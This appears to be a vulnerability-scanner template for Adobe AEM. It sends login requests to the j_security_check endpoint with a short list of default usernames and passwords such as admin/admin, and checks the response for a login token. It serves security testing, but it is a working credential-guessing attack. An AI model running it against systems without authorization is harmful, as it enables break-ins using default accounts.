id: aem-default-login

info:
  name: Adobe AEM Default Login
  author: random-robbie
  severity: critical
  tags: aem,default-login,fuzz

requests:
  - raw:
      - |
        POST /libs/granite/core/content/login.html/j_security_check HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: {{BaseURL}}
        Referer: {{BaseURL}}/libs/granite/core/content/login.html

        _charset_=utf-8&j_username={{username}}&j_password={{password}}&j_validate=true

    payloads:
      username:
        - admin
        - grios
        - replication-receiver
        - vgnadmin

      password:
        - admin
        - password
        - replication-receiver
        - vgnadmin

    attack: pitchfork
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - login-token
          - crx.default
        condition: and
